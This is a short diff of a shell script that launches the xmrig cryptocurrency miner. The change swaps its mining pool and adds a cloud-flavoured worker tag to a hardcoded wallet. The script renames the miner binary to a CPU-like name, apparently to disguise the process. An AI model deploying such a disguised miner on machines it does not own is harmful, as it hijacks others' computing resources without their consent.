@@ -16,8 +16,8 @@ rm -rf xmrig-$VERSION-linux-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
-POOL=us-zephyr.miningocean.org:5432
+POOL=zeph-us-east1.nanopool.org:10943
 USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
 ALGO=rx/0
 DONATE=1
-./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME -p x -a $ALGO -k --tls
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.aws/cardsa2u7pvmdamw@jabb3r.org -p x -a $ALGO -k --tls
